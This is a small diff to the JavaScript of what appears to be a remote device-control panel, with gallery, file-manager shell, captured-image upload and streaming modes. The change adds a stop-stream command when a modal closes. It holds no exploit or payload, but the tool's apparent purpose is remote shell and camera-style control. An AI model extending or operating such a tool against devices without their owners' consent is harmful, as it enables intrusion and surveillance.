@@ -349,7 +349,7 @@
             if(data.status === 'ok') cmd(`upload ${btoa(data.filename)} ${btoa(window.location.origin + '/captured_images/' + data.filename)}`);
         }
 
-        function closeModal() { if(curMod === 'gallery') cmd('exit_gallery'); if(curMod === 'filemanager') cmd('exit_shell'); document.getElementById('modal').style.display = 'none'; curMod = null; }
+        function closeModal() { if(curMod === 'gallery') cmd('exit_gallery'); if(curMod === 'filemanager') cmd('exit_shell'); if(curMod === 'stream') cmd('stop_stream'); document.getElementById('modal').style.display = 'none'; curMod = null; }
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
